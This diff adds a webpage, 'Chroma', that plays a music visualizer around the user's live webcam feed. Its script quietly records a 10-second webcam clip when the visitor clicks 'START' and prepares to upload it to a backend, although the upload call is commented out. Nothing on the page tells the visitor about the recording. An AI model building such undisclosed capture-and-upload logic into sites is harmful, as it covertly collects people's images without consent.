@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    
+    <link rel="stylesheet" href="CSS/main.css" />
+    <link rel="stylesheet" href="CSS/fireflies.css">
+    <link rel="stylesheet" href="CSS/visualizer.css">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Tiny5&display=swap" rel="stylesheet">
+    
+    <title>Chroma</title>
+
+    <style>
+        /* --- BASICS --- */
+        body {
+            margin: 0;
+            overflow: hidden; /* Prevent scrollbars */
+        }
+
+        .background, 
+        #fireflies, 
+        #scary-fireflies {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .ui-layer {
+            position: relative;
+            z-index: 10;
+            pointer-events: auto;
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            width: 100%;
+        }
+
+        /* --- OVERLAY --- */
+        #overlay {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: transparent;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 100; 
+            cursor: pointer;
+            padding-bottom: 300px; /* High Lift */
+            transition: opacity 0.5s ease;
+        }
+        
+        #overlay span {
+            font-family: "Tiny5", sans-serif;
+            font-size: 25px; 
+            margin: 0;
+            color: #fff;
+            text-shadow: 0 0 10px #3BC1A8, 0 0 5px black;
+            letter-spacing: 3px; 
+            animation: float 3s ease-in-out infinite;
+            pointer-events: none; 
+            text-align: center;
+        }
+        
+        #overlay p {
+            font-family: "Tiny5", sans-serif;
+            color: #3BC1A8;
+            text-shadow: 0 0 2px black;
+            margin-top: 8px;
+            font-size: 15px; 
+            animation: blink 1s infinite;
+            pointer-events: none;
+        }
+
+        /* --- VISUALIZER CONTAINER --- */
+        .visualizer-container {
+            position: relative;
+            width: 600px;
+            height: 600px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            
+            /* Initial State */
+            top: -80px; 
+            opacity: 0; 
+            transition: opacity 1.5s ease-in-out;
+            
+            /* Ensures scaling happens from the center */
+            transform-origin: center center;
+        }
+
+        #visualizer {
+            position: absolute;
+            top: 0; left: 0;
+            z-index: 2;
+            pointer-events: none;
+            image-rendering: pixelated; 
+        }
+
+        #webcam {
+            position: absolute;
+            z-index: 1;
+            width: 260px; 
+            height: 260px;
+            border-radius: 50%; 
+            object-fit: cover;
+            transform: scaleX(-1);
+            background: #05080a;
+            border: 4px solid #1a2e33;
+            box-shadow: 0 0 20px rgba(59, 193, 168, 0.1);
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="background"></div>
+    <canvas id="fireflies"></canvas>
+    <canvas id="scary-fireflies"></canvas>
+    
+    <div class="ui-layer">
+        <div class="header">
+            <div class="btn-menu">menu</div>
+            <div class="btn-login"><a href="loginpage.html">Wallet</a></div>
+        </div>
+        
+        <div class="header-box" style="margin-bottom: 10px;">
+            <p class="heading">CHROMA</p>
+        </div>
+        
+        <div class="main-content">
+            <div id="overlay">
+                <span>START</span>
+                <p>[ CLICK TO REVEAL ]</p>
+            </div>
+        
+            <div class="visualizer-container">
+                <video id="webcam" autoplay playsinline muted></video>
+                <canvas id="visualizer" width="600" height="600"></canvas>
+            </div>
+        
+            <audio id="audio" src="audio/edm.mp3" crossorigin="anonymous" loop></audio>
+        </div>
+    </div>
+    
+    <script src="JS/Innerfirefiles.js"></script>
+    <script src="JS/Outerfireflies.js"></script>
+
+    <script>
+    const VIS_CONFIG = { radius: 130, barLen: 70, barCount: 80 };
+    const VIS_THEME = "#3BC1A8";
+    
+    // --- BACKEND CONFIG ---
+    const BACKEND_URL = "http://localhost:3000/process-video"; // CHANGE THIS
+
+    const visCanvas = document.getElementById("visualizer");
+    const visCtx = visCanvas.getContext("2d");
+    
+    const video = document.getElementById("webcam");
+    const audio = document.getElementById("audio");
+    const overlay = document.getElementById("overlay");
+    const visContainer = document.querySelector('.visualizer-container');
+    const overlayText = document.querySelector('#overlay span');
+
+    let audioCtx, analyser, dataArray, source;
+    let isRunning = false;
+    let globalStream = null; // Store stream for recording
+
+    // --- 1. SMART RESIZING LOGIC ---
+    function resizeVisualizer() {
+        if (!visContainer || !overlayText) return; 
+
+        const width = window.innerWidth;
+        const height = window.innerHeight;
+        const baseSize = 650; 
+        const availableHeight = height - 150; 
+        
+        let scale = Math.min(width / baseSize, availableHeight / baseSize, 1);
+        
+        visContainer.style.transform = `scale(${scale})`;
+        
+        if (scale < 0.6) {
+            overlayText.style.fontSize = "25px"; 
+            overlay.style.paddingBottom = "200px"; 
+        } else {
+            overlayText.style.fontSize = "35px"; 
+            overlay.style.paddingBottom = "300px"; 
+        }
+    }
+
+    window.addEventListener('resize', resizeVisualizer);
+    resizeVisualizer();
+
+    // --- 2. PRELOAD WEBCAM (HIGH RES) ---
+    async function startWebcam() {
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            try {
+                // Request 1080p (Full HD)
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 1920 }, 
+                        height: { ideal: 1080 } 
+                    } 
+                });
+                video.srcObject = stream;
+                globalStream = stream; // Save for recording
+            } catch (err) {
+                console.error("Camera Error:", err);
+            }
+        }
+    }
+    startWebcam();
+
+    // --- 3. RECORDING LOGIC ---
+    function recordAndSend() {
+        if (!globalStream) {
+            console.warn("No camera stream available to record.");
+            return;
+        }
+
+        console.log("🔴 Recording 10s clip...");
+        const mediaRecorder = new MediaRecorder(globalStream);
+        const chunks = [];
+
+        mediaRecorder.ondataavailable = (e) => {
+            if (e.data.size > 0) chunks.push(e.data);
+        };
+
+        mediaRecorder.onstop = async () => {
+            console.log("⏹️ Recording stopped. Preparing to upload...");
+            const blob = new Blob(chunks, { type: "video/webm" });
+            
+            // Create FormData to send to backend
+            const formData = new FormData();
+            formData.append("video", blob, "capture_" + Date.now() + ".webm");
+
+            try {
+                // Send to backend
+                // Uncomment this when you have a backend ready
+                /* const response = await fetch(BACKEND_URL, {
+                    method: "POST",
+                    body: formData
+                });
+                const result = await response.json();
+                console.log("✅ Upload success:", result);
+                */
+               console.log("✅ Blob created (Size: " + blob.size + " bytes). Ready to send to: " + BACKEND_URL);
+            } catch (err) {
+                console.error("❌ Upload failed:", err);
+            }
+        };
+
+        // Start recording
+        mediaRecorder.start();
+
+        // Stop after 10 seconds
+        setTimeout(() => {
+            mediaRecorder.stop();
+        }, 10000);
+    }
+
+    // --- 4. CLICK TO START & TRIGGER RECORD ---
+    if (overlay) {
+        overlay.addEventListener("click", async () => {
+            overlay.style.opacity = "0";
+            setTimeout(() => { overlay.style.display = "none"; }, 500);
+
+            visContainer.style.opacity = "1";
+            
+            // START RECORDING IMMEDIATELY
+            recordAndSend();
+            
+            try {
+                const AudioContext = window.AudioContext || window.webkitAudioContext;
+                if (!audioCtx) audioCtx = new AudioContext();
+                await audioCtx.resume();
+                await audio.play();
+
+                if (!analyser) {
+                    analyser = audioCtx.createAnalyser();
+                    analyser.fftSize = 256; 
+                    const bufferLength = analyser.frequencyBinCount;
+                    dataArray = new Uint8Array(bufferLength);
+                }
+
+                if (!source) {
+                    try {
+                        source = audioCtx.createMediaElementSource(audio);
+                        source.connect(analyser);
+                        analyser.connect(audioCtx.destination);
+                    } catch (e) {
+                        console.warn("CORS/Server Error. Audio plays, vis might not move.");
+                    }
+                }
+                
+                if (!isRunning) {
+                    isRunning = true;
+                    draw();
+                }
+            } catch (error) {
+                console.error("Audio Init Failed:", error);
+            }
+        });
+    }
+
+    function draw() {
+        requestAnimationFrame(draw);
+        if (!analyser) return;
+
+        analyser.getByteFrequencyData(dataArray);
+        
+        visCtx.clearRect(0, 0, visCanvas.width, visCanvas.height);
+
+        const cx = visCanvas.width / 2;
+        const cy = visCanvas.height / 2;
+        const angleStep = (Math.PI * 2) / VIS_CONFIG.barCount;
+
+        for (let i = 0; i < VIS_CONFIG.barCount; i++) {
+            let norm = i / (VIS_CONFIG.barCount / 2);
+            if (norm > 1) norm = 2 - norm;
+            
+            const dataIdx = Math.floor(norm * 60) + 4; 
+            const val = dataArray[dataIdx] || 0;
+            const normalizedVal = val / 255;
+            const len = Math.pow(normalizedVal, 3) * VIS_CONFIG.barLen;
+
+            const angle = (i * angleStep) - (Math.PI / 2);
+            const nx = Math.cos(angle);
+            const ny = Math.sin(angle);
+
+            const x1 = cx + nx * (VIS_CONFIG.radius + 2);
+            const y1 = cy + ny * (VIS_CONFIG.radius + 2);
+            const x2 = cx + nx * (VIS_CONFIG.radius + 2 + len);
+            const y2 = cy + ny * (VIS_CONFIG.radius + 2 + len);
+
+            visCtx.strokeStyle = VIS_THEME;
+            visCtx.shadowBlur = normalizedVal * 15; 
+            visCtx.shadowColor = VIS_THEME;
+            visCtx.lineWidth = 8; 
+            visCtx.lineCap = "butt"; 
+
+            visCtx.beginPath();
+            visCtx.moveTo(x1, y1);
+            visCtx.lineTo(x2, y2);
+            visCtx.stroke();
+            visCtx.shadowBlur = 0;
+        }
+
+        visCtx.strokeStyle = "#1a2e33"; 
+        visCtx.lineWidth = 0;
+        visCtx.beginPath();
+        visCtx.arc(cx, cy, VIS_CONFIG.radius, 0, Math.PI * 2);
+        visCtx.stroke();
+    }
+    </script>
+</body>
+</html>
